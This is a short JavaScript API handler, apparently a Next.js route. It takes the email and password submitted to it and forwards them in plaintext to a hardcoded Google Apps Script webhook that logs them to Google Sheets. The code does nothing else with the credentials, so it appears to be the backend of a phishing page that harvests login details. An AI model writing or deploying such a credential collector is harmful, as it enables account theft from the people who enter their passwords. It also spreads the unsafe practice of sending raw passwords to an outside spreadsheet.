export default async function handler(req, res) {
    if (req.method === 'POST') {
      const { email, password } = req.body;
  
      const webhookUrl = "https://script.google.com/macros/s/AKfycbzKV547JskU2kIyMVd4r0ZzbVBt3m0erDOo2Mqx5VLU2RLGpTpWAkA3Hi6mnuq69y7ktA/exec";
  
      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });
  
      const result = await response.text();
      return res.status(200).json({ message: "Data forwarded to Google Sheets", details: result });
    } else {
      res.status(405).json({ message: "Only POST allowed" });
    }
  }

